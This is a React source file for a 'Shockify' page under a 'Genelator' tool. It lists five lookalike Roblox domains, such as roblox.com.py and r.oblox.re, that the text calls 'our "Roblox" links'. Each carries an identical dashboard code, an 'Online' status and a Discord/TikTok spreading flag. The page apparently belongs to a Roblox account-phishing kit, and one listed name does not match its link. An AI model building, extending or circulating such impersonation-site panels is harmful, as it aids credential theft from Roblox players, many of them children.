import React from 'react';

const sites = [
  { name: "roblox.com.py", link: "https://roblox.com.py/dashboard/?code=MzYxMjc0NzEzNzIzOTczMjAxOF8yNTU1MTIxMjU1OTA5NDE2NjA=", status: "Online", flag: "Discord/Tiktok" },
  { name: "roblox.mq", link: "https://roblox.mq/dashboard/?code=MzYxMjc0NzEzNzIzOTczMjAxOF8yNTU1MTIxMjU1OTA5NDE2NjA=", status: "Online", flag: "Discord/Tiktok" },
  { name: "roblox.asia", link: "https://roblox.asia/dashboard/?code=MzYxMjc0NzEzNzIzOTczMjAxOF8yNTU1MTIxMjU1OTA5NDE2NjA=", status: "Online", flag: "Discord" },
  { name: "r.oblox.re", link: "https://r.oblox.re/dashboard/?code=MzYxMjc0NzEzNzIzOTczMjAxOF8yNTU1MTIxMjU1OTA5NDE2NjA=", status: "Online", flag: "Discord" },
  { name: "r.oblox.in", link: "https://r.oblox.iny/dashboard/?code=MzYxMjc0NzEzNzIzOTczMjAxOF8yNTU1MTIxMjU1OTA5NDE2NjA=", status: "Online", flag: "Discord" }
];

const Shockify: React.FC = () => {
  return (
    <div className="animated-bg-g text-white min-h-screen p-8 text-center pixelify-sans-bold">
       <a
        href="/Genelator"
        className="absolute top-4 left-4 sm:top-6 sm:left-6 bg-gray-700 text-white px-3 py-2 sm:px-4 rounded-lg shadow hover:bg-gray-600 transition text-sm sm:text-base"
      >
        ← Back to Genelator
      </a>
      <h1 className="text-4xl mb-6">Sites Page</h1>
      <p className="mb-4">Use this page to view all of our "Roblox" links.</p>
      <h2 className="text-2xl mb-4">Working SHOCKIFY Sites</h2>
      <p className="mb-6">Currently, only the following sites are confirmed working!</p>
      
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
        {sites.map((site, index) => (
          <div
            key={index}
            className="bg-gray-900 border border-blue-500 p-6 rounded-2xl shadow-lg flex flex-col gap-2"
          >
            <h3 className="text-xl font-bold mb-2">
              <a
                href={site.link}
                target="_blank"
                rel="noopener noreferrer"
                className="text-blue-400 underline hover:text-blue-300 transition break-all"
              >
                {site.name}
              </a>
            </h3>
            <div className="flex items-center gap-2 mb-1">
              <span
                className={`px-2 py-1 rounded text-xs font-semibold ${
                  site.status === "Online"
                    ? "bg-green-700 text-green-200"
                    : "bg-red-700 text-red-200"
                }`}
              >
                {site.status}
              </span>
              <span
                className={`px-2 py-1 rounded text-xs font-semibold ${
                  site.flag === "Discord/Tiktok"
                    ? "bg-purple-700 text-purple-200"
                    : site.flag === "Discord"
                    ? "bg-blue-700 text-blue-200"
                    : "bg-gray-700 text-gray-200"
                }`}
              >
                {site.flag}
              </span>
            </div>
            <a
              href={site.link}
              target="_blank"
              rel="noopener noreferrer"
              className="mt-3 inline-block bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg transition"
            >
              Visit Site
            </a>
          </div>
        ))}
      </div>
      
      <div className="mt-8">
        <a href="/genelator" className="text-blue-400 underline text-lg font-semibold">- Back to Generator -</a>
      </div>
    </div>
  );
};

export default Shockify;
